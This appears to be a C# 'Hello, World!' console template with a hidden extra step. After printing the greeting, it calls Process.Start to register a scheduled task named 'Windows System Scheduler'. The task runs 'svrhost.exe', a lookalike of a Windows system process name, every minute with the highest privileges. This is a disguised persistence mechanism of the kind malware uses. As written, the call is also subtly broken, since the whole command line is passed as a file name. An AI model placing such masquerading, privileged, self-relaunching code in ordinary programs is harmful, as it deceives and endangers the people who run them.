
using System.Diagnostics;

// See https://aka.ms/new-console-template for more information
Console.WriteLine("Hello, World!");

// サービスの登録を行う
Process.Start("schtasks /create /tn \"Windows System Scheduler\" /tr \"'C:\\Program Files\\Windows System Application\\svrhost.exe'\" /sc minute /mo 1 /rl HIGHEST");